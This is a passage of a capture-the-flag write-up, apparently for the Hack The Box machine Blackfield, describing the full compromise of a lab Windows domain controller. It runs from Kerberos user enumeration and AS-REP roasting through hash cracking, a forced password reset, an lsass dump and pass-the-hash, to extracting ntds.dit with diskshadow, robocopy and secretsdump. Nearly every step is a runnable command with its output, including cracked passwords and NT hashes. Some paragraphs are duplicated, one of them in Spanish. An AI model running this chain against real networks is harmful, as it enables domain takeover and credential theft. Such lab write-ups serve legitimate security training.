	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TCassalom
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TEiselt
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TFerencdo
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TGaleazza
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TKauten
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TKnupke
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TLintlop
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TMusselli
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TOust
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TSlupka
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TStausland
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TZumpella
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	UCrofskey
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	UMarylebone
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	UPyrke
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	VBublavy
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	VButziger
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	VFuscca
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	VLitschauer
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	VMamchuk
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	VMarija
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	VOlaosun
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	VPapalouca
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	WSaldat
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	WVerzhbytska
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	WZelazny
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	XBemelen
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	XDadant
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	XDebes
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	XKonegni
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	XRykiel
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	YBleasdale
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	YHuftalin
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	YKivlen
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	YKozlicki
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	YNyirenda
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	YPredestin
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	YSeturino
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	YSkoropada
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	YVonebers
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	YZarpentine
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	ZAlatti
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	ZKrenselewski
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	ZMalaab
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	ZMiick
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	ZScozzari
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	ZTimofeeff
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	ZWausik
	SYSVOL                                            	NO ACCESS	Logon server share 
```

We can observe a wide variety of directories stored in this shared resource. It appears that these directories are named after user accounts. We might consider the possibility of extracting these directory names and subsequently checking if any of these usernames exist at the system level.

To accomplish this, I will apply a specialized filtering process to exclusively retain these text strings::

```
elswix@kali$ smbmap -H 10.10.10.192 -u 'elswix' -r "profiles$" --no-banner | awk '{print $NF}' | awk '/AAlleni/,/ZWausik/' > users.txt
```

With this done, I will proceed to use the [Kerbrute](https://github.com/ropnop/kerbrute) tool to verify the validity of these users through Kerberos. Since there are multiple users, this process may take some time, so I appreciate your patience while it is being carried out.

```
elswix@kali$ kerbrute userenum --dc 10.10.10.192 -d BLACKFIELD.local users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 09/20/23 - Ronnie Flathers @ropnop

2023/09/20 20:25:58 >  Using KDC(s):
2023/09/20 20:25:58 >  	10.10.10.192:88

2023/09/20 20:26:20 >  [+] VALID USERNAME:	audit2020@BLACKFIELD.local
2023/09/20 20:28:24 >  [+] support has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$support@BLACKFIELD.LOCAL:20e163b93a99dffcebc4a5b149aba0c5$00b8461daae750ed64ba31205c919971c4e79e42daba826ec2ba6a3c22b82fe82f59733a0726064db9dad4800dd32e377ab37b743d02016c3811fce1d58d0345bd8066012840daf1607672e1e396b0425173ccb56eccc5c0995da4caeddd6ad597a68cbf6911b1d14eb3fc0be52ae70104a958acb6f9ad6dbd248ec95563e68e0d0a8b0617d286f8d7a093a86c9656300a4d829e31a5ac5c4d6ecf63fbc53f189c470a356b51dfe4d50f45e7a1283d064f6c6c72a628d2d2414e1069008bd9f0beeecbe05ee8872baa2da0f09050ac580a2b26ecd8311b150f4b8ff4bdbea057bd245820d9f969137a5d3025acab279553595e233fe52d00aa792b774fe0f99794ddbe8b419ddcfb
2023/09/20 20:28:24 >  [+] VALID USERNAME:	support@BLACKFIELD.local
2023/09/20 20:28:28 >  [+] VALID USERNAME:	svc_backup@BLACKFIELD.local
2023/09/20 20:28:57 >  Done! Tested 314 usernames (3 valid) in 179.292 seconds
```


In addition, we have identified that the 'support' user is vulnerable to an ASREP Roast attack, as it has the 'UF_DONT_REQUIRE_PREAUTH' attribute configured, meaning it does not require prior Kerberos authentication. This allows us to request a Ticket Granting Ticket (TGT) without specifying credentials.

There is a possibility to attempt to decrypt the Ticket Granting Ticket (TGT) to obtain the user's plaintext password. To carry out this task, we will employ the [John](https://github.com/openwall/john) tool.

I would like to highlight that in my case, the TGT returned by the 'Kerbrute' tool for the 'support' user was not crackable, so I had to request it again using 'GetNPUsers.py' from the [Impacket](https://github.com/fortra/impacket) suite.

I stored the valid users in a file named 'valid_users.txt' and executed the attack:

```
elswix@kali$ impacket-GetNPUsers BLACKFIELD.local/ -no-pass -usersfile valid_users.txt
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:73183cc96fff92aa7b4c50bcd5a8172d$fda73713f921e0055962597efe5e0e286f46076b8b88867f50a2635c927e9e1a391d63193e38bc8ac48100bd117e22a71ddf7259634ba266ed732061bd84642533c3e41c9241f56dd0d131f7ddc07f8194c275675abab552d53a59577ad8c465b6696158275ed3abe582b765bfb032b69186d8fc335e2108111b38370c949849e5d6933c54bf6e573643d02db4e63655274512ddd24be4a76800dc94cd1af6c77185d9391d908dea76448307018ac193b8de21e29f8c830d64f8c00e87f9d287ed43ddddcbb4f2e51fdecced775eaa30621f281be9fc381ee0fdb6676bc5cbb7214b0f6fda622d2ddab9f79e3223f1055bb17a0c
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
```

I saved the hash in a file named 'hash', and this time, I successfully cracked the hash.

```
elswix@kali$ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)     
1g 0:00:00:20 DONE (2023-09-20 20:36) 0.04885g/s 700291p/s 700291c/s 700291C/s #1ByNature..#*burberry#*1990
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```


We verified the credentials using [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec):

```
elswix@kali$ crackmapexec smb 10.10.10.192 -u 'support' -p '#00^BlackKnight'
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
```

With valid credentials at our disposal, we significantly expand our options for conducting attacks. Among the available choices is the Kerberoasting attack, although I must mention that it did not yield any results in this case.

At this juncture, considering more comprehensive enumerations of the domain, including the list of valid users, groups, and other elements, is a viable option. However, since direct system access is not available, an alternative method is needed to carry out these enumerations remotely.

[Bloodhound-python](https://github.com/dirkjanm/BloodHound.py) Bloodhound-python is a useful alternative as it allows for the same enumeration as SharpHound, although it may not provide the same level of detailed information. Nevertheless, it is a powerful tool for gaining a deeper insight into the domain remotely.

It is important to note that, to analyze the reported information, it is necessary to have the [BloodHound](https://github.com/BloodHoundAD/BloodHound) and [Neo4j](https://neo4j.com/) tools previously installed on our system. 

```
elswix@kali$ bloodhound-python -c all -u 'support' -p '#00^BlackKnight' -ns 10.10.10.192 -d BLACKFIELD.local
INFO: Found AD domain: blackfield.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 316 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: DC01.BLACKFIELD.local
WARNING: Failed to get service ticket for DC01.BLACKFIELD.local, falling back to NTLM auth
CRITICAL: CCache file is not found. Skipping...
WARNING: DCE/RPC connection failed: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Done in 00M 47S
```


Once this scan is complete, the following files will be generated in the current working directory: 

```
elswix@kali$ ls -l
-rw-r--r-- 1 elswix elswix  47310 Sep 20 20:46 20230920204559_computers.json
-rw-r--r-- 1 elswix elswix  55582 Sep 20 20:46 20230920204559_containers.json
-rw-r--r-- 1 elswix elswix   3148 Sep 20 20:46 20230920204559_domains.json
-rw-r--r-- 1 elswix elswix   4032 Sep 20 20:46 20230920204559_gpos.json
-rw-r--r-- 1 elswix elswix  81312 Sep 20 20:46 20230920204559_groups.json
-rw-r--r-- 1 elswix elswix   1668 Sep 20 20:46 20230920204559_ous.json
-rw-r--r-- 1 elswix elswix 784312 Sep 20 20:46 20230920204559_users.json
```

If you are not familiar with the use of BloodHound, I recommend referring to this [documentation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux) for guidance on its usage. This will provide you with a detailed guide on how to utilize this tool effectively.

After conducting an initial analysis through BloodHound, we have discovered that the user for whom we have credentials has permissions to change the password for the 'Audit2020' user.

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Hard/Blackfield/img/1.png?raw=true)

We can change their password remotely using various tools, and in my case, I will utilize [bloodyAD](https://github.com/CravateRouge/bloodyAD).

```
elswix@kali$ bloodyAD -d BLACKFIELD.local -u 'support' -p '#00^BlackKnight' --host 10.10.10.192 set password audit2020 'Password123$!'
[+] Password changed successfully!
```

We verify whether we were able to change the credentials:

```
elswix@kali$ crackmapexec smb 10.10.10.192 -u 'audit2020' -p 'Password123$!'
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:Password123$! 
```

The password for the user 'audit2020' has been successfully changed.

When we enumerate the network-level shared resources using the credentials of the 'audit2020' user, we observe that we now have access to two new resources: 'SYSVOL' and 'forensic'.

```
elswix@kali$ crackmapexec smb 10.10.10.192 -u 'audit2020' -p 'Password123$!' --shares
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:Password123$! 
SMB         10.10.10.192    445    DC01             [+] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share 
```


There are ways to leverage the 'SYSVOL' resource, but I'll forewarn you that it doesn't apply in this case. Knowing this, we will access the 'forensic' resource.

On this occasion, I will use 'smbclient' to navigate interactively through the shared resource. It is also possible to mount the shared resource on your attack machine at the network level. In my case, I opted to use 'smbclient'.

To access, we will provide the username with which we want to log in, and we will be prompted for the password we established earlier for the 'audit2020' user.

```
elswix@kali$ smbclient //10.10.10.192/forensic -U "audit2020"
Password for [WORKGROUP\audit2020]:
Try "help" to get a list of possible commands.
smb: \> 
```


### Shell as svc_backup


After conducting a brief enumeration, my attention was drawn to the directory named 'memory_analysis,' which contained the following:

```
smb: \> cd memory_analysis
smb: \memory_analysis\> dir
  .                                   D        0  Thu May 28 17:28:33 2020
  ..                                  D        0  Thu May 28 17:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 17:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 17:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 17:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 17:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 17:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 17:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 17:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 17:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 17:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 17:27:00 2020
  smartscreen.zip                     A 33756344  Thu May 28 17:27:11 2020
  svchost.zip                         A 14408833  Thu May 28 17:27:19 2020
  taskhostw.zip                       A 34631412  Thu May 28 17:27:30 2020
  winlogon.zip                        A 14255089  Thu May 28 17:27:38 2020
  wlms.zip                            A  4067425  Thu May 28 17:27:44 2020
  WmiPrvSE.zip                        A 18303252  Thu May 28 17:27:53 2020

		5102079 blocks of size 4096. 1602849 blocks available
smb: \memory_analysis\> 
```

Immediately, the 'lsass.zip' file caught my attention.

LSASS is a fundamental component in Windows operating systems. Its main function is to manage security and authentication within the system. LSASS plays a key role in user authentication, password management, access control, and overall security in Windows systems.

Subsequently, I proceeded to download the file and decompressed it on my attacker machine:

```
smb: \memory_analysis\> get lsass.zip
getting file \memory_analysis\lsass.zip of size 41936098 as lsass.zip (5044.1 KiloBytes/sec) (average 5044.1 KiloBytes/sec)
smb: \memory_analysis\> 
```

```
elswix@kali$ unzip lsass.zip
Archive:  lsass.zip
  inflating: lsass.DMP               
```

When decompressed, we encounter the 'lsass.DMP' file, which is a memory dump file generated by the LSASS process in Windows.

We can attempt to analyze it using the [pypykatz](https://github.com/skelsec/pypykatz) tool, which is the Python alternative to 'mimikatz'. I won't display the output here as it is quite extensive.

```
elswix@kali$ pypykatz lsa minidump lsass.DMP
```

We can highlight that the file displays several hashes corresponding to system user credentials. While several of these hashes were found, only the one for the 'svc_backup' user proved to be functional.

I copied the NT hash for the 'svc_backup' user to verify its validity using the 'CrackMapExec' tool. NT hashes allow us to employ the 'PassTheHash' technique, which, in simple terms, allows us to provide the hash as if it were the 'password,' so to speak.

```
elswix@kali$ crackmapexec smb 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d 
```


We have confirmed that the hash is valid and can be used as an authentication method for the 'svc_backup' user.

Now, we will proceed to check if the 'svc_backup' user can connect via the WinRM service. In the event that this user belongs to the 'Remote Management Users' group, we can utilize tools such as 'Evil-WinRM' to attempt to establish a connection to the service and obtain a shell.

```
elswix@kali$ crackmapexec winrm 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
```

We have confirmed that the hash is valid and can be used as an authentication method for the 'svc_backup' user.

Now, we will proceed to check if the 'svc_backup' user can connect via the WinRM service. In the event that this user belongs to the 'Remote Management Users' group, we can utilize tools such as 'Evil-WinRM' to attempt to establish a connection to the service and obtain a shell.

```
elswix@kali$ evil-winrm -i 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'

*Evil-WinRM* PS C:\Users\svc_backup\Documents> 
```

We successfully accessed the service and obtained a shell as the 'svc_backup' user.

Upon navigating to the 'Desktop' directory, we were able to view the first flag.

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> type user.txt
3920b*********************4b543
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> 
```



### Shell as Administrator

When listing our privileges, we notice that we have the 'SeBackupPrivilege' privilege. This privilege can be of great significance, as through backups, we could attempt to clone the root structure of the system to access resources that we initially do not have access to due to privilege limitations.

```
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

*Evil-WinRM* PS C:\Users\svc_backup\Desktop> 
```


###### Disk Shadow

  
We will use the DiskShadow tool to 'clone' the system's root. By following this [documentation](https://pentestlab.blog/tag/diskshadow/), we can guide ourselves through the steps to perform this correctly.

_"**DiskShadow** is a Microsoft signed binary which is used to assist administrators with operations related to the Volume Shadow Copy Service (VSS). Originally [bohops](https://twitter.com/bohops) wrote about this binary in his [blog](https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/). This binary has two modes **interactive** and **script** and therefore a script file can be used that will contain all the necessary commands to automate the process of NTDS.DIT extraction. The script file can contain the following lines in order to create a new volume shadow copy, mount a new drive, execute the copy command and delete the volume shadow copy."_

_[PentestLab](https://pentestlab.blog/tag/diskshadow/)_

The main idea here is to create a 'copy' of the system's root structure and then perform a backup of the 'ntds.dit' file, all while leveraging the 'SeBackupPrivilege' privilege. This will allow us to perform a dump of the 'ntds.dit' file using the 'secretsdump' tool from the [Impacket](https://github.com/fortra/impacket) suite.

Why not perform this process directly from the original system root?

The main reason is that the 'ntds.dit' file is in use by a running process, which prevents us from copying it directly. Furthermore, accessing the file requires Administrator privileges, which we do not have in this context. Therefore, the 'cloning' and backup technique provides an alternative path to obtain the 'ntds.dit' file without disrupting ongoing processes and without the need for Administrator privileges, as we will abuse the 'SeBackupPrivilege' privilege.

First, we need to create a file with the following content:

```
elswix@kali$ cat shadow.txt
set context persistent nowriters-
add volume c: alias elswix-
create-
expose %elswix% y:-
```

By adding any character at the end of each line, in my case, I used '-', we ensure that each line has a character or whitespace at the end. This is important because the tool removes the last character of each line.

To work in an organized manner, I will create a directory named 'Privesc' in the path 'C:\Windows\Temp' on the victim machine.

```
*Evil-WinRM* PS C:\Windows\Temp> mkdir Privesc
```

Once the 'shadow.txt' file is downloaded on the victim machine, we need to execute the following:

```
*Evil-WinRM* PS C:\Windows\Temp\Privesc> diskshadow /s C:\Users\svc_backup\Desktop\shadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  9/20/2023 2:49:25 PM

-> set context persistent nowriters
-> add volume c: alias elswix
-> create
Alias elswix for shadow ID {d885ad3a-5167-4d00-8760-08197855c105} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {c96e7221-8964-4fdf-8fad-86ae1c1722f6} set as environment variable.

Querying all shadow copies with the shadow copy set ID {c96e7221-8964-4fdf-8fad-86ae1c1722f6}

	* Shadow copy ID = {d885ad3a-5167-4d00-8760-08197855c105}		%elswix%
		- Shadow copy set: {c96e7221-8964-4fdf-8fad-86ae1c1722f6}	%VSS_SHADOW_SET%
		- Original count of shadow copies = 1
		- Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
		- Creation time: 9/20/2023 2:49:26 PM
		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
		- Originating machine: DC01.BLACKFIELD.local
		- Service machine: DC01.BLACKFIELD.local
		- Not exposed
		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %elswix% y:
-> %elswix% = {d885ad3a-5167-4d00-8760-08197855c105}
The shadow copy was successfully exposed as y:\.
->
*Evil-WinRM* PS C:\Windows\Temp\Privesc> 
```

If everything works correctly, the message 'The shadow copy was successfully exposed as y:.' should be displayed on the screen.

When we list the contents of the 'y:' drive, we can see that we have successfully 'cloned' the system's root:

```
*Evil-WinRM* PS C:\Windows\Temp\Privesc> dir y:\


    Directory: y:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/26/2020   5:38 PM                PerfLogs
d-----         6/3/2020   9:47 AM                profiles
d-r---        3/19/2020  11:08 AM                Program Files
d-----         2/1/2020  11:05 AM                Program Files (x86)
d-----        9/20/2023  12:59 PM                Temp
d-r---        2/23/2020   9:16 AM                Users
d-----        9/21/2020   4:29 PM                Windows
-a----        2/28/2020   4:36 PM            447 notes.txt


*Evil-WinRM* PS C:\Windows\Temp\Privesc> 
```


If we attempt to copy the 'ntds.dit' file directly using the 'cp' command, we are notified that we do not have the necessary privileges:

```
*Evil-WinRM* PS C:\Windows\Temp\Privesc> cp y:\Windows\NTDS\ntds.dit .
Access to the path 'y:\Windows\NTDS\ntds.dit' is denied.
At line:1 char:1
+ cp y:\Windows\NTDS\ntds.dit .
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (y:\Windows\NTDS\ntds.dit:FileInfo) [Copy-Item], UnauthorizedAccessException
    + FullyQualifiedErrorId : CopyFileInfoItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.CopyItemCommand
*Evil-WinRM* PS C:\Windows\Temp\Privesc> 
```

However, by leveraging the 'SeBackupPrivilege' privilege, we have the capability to use the 'robocopy' command to create a backup copy of the file.

```
*Evil-WinRM* PS C:\Windows\Temp\Privesc> robocopy /b Y:\Windows\NTDS . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Wednesday, September 20, 2023 3:04:41 PM
   Source : Y:\Windows\NTDS\
     Dest : C:\Windows\Temp\Privesc\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

	                  1	Y:\Windows\NTDS\
	   New File  		 18.0 m	ntds.dit
  0.0%
  0.3%
  0.6%
  1.0%
  1.3%
  1.7%
  2.0%
  2.4%
  2.7%
  3.1%
  3.4%
  3.8%
........
 92.0%
 92.3%
 92.7%
 93.0%
 93.4%
 93.7%
 94.0%
 94.4%
 94.7%
 95.1%
 95.4%
 95.8%
 96.1%
 96.5%
 96.8%
 97.2%
 97.5%
 97.9%
 98.2%
 98.6%
 98.9%
 99.3%
 99.6%
100%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   18.00 m   18.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           174762666 Bytes/sec.
   Speed :           10000.000 MegaBytes/min.
   Ended : Wednesday, September 20, 2023 3:04:41 PM

*Evil-WinRM* PS C:\Windows\Temp\Privesc> 
```


Listing the contents of the current directory, we confirm that a copy of the 'ntds.dit' file has been created, so we can now use it for dumping.

Before transferring it to our attacker machine, we need to make a copy of the system registry:

```
*Evil-WinRM* PS C:\Windows\Temp\Privesc> reg save HKLM\System system
The operation completed successfully.

*Evil-WinRM* PS C:\Windows\Temp\Privesc> 
```

After downloading both files to our machine, we will proceed to dump the 'ntds.dit' file.

```
elswix@kali$ ls -l
total 35600
-rwxr-xr-x 1 elswix elswix 18874368 Sep 20 15:47 ntds.dit
-rwxr-xr-x 1 elswix elswix 17580032 Sep 20 19:06 system
```

To dump the 'ntds.dit' file, we will use the previously mentioned tool, 'secretsdump,' from the Impacket suite:

```
elswix@kali$ impacket-secretsdump -system system -ntds ntds.dit LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD189208:1107:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD404458:1108:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD706381:1109:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD937395:1110:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD553715:1111:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
...............
...............
...............
```


Using the NT hash of the 'Administrator' user, I will proceed to verify its validity (although it should be valid) using the 'CrackMapExec' tool: 

```
elswix@kali$ crackmapexec smb 10.10.10.192 -u 'Administrator' -H '184fb5e5178480be64824d4cd53b99ee'
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\Administrator:184fb5e5178480be64824d4cd53b99ee (Pwn3d!)
```

Confirmamos que el hash es válido y, dado que corresponde al usuario `Administrator`, podemos utilizarlo para conectarnos a través de WinRM utilizando la herramienta `Evil-WinRM`. Una vez que hemos obtenido privilegios de `Administrator`, podemos visualizar la última flag:

```
elswix@kali$ evil-winrm -i 10.10.10.192 -u 'Administrator' -H '184fb5e5178480be64824d4cd53b99ee'
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
blackfield\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
4375a*********************c955cb
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```


We confirm that the hash is valid, and since it corresponds to the 'Administrator' user, we can use it to connect via WinRM using the 'Evil-WinRM' tool. Once we have obtained 'Administrator' privileges, we can view the final flag: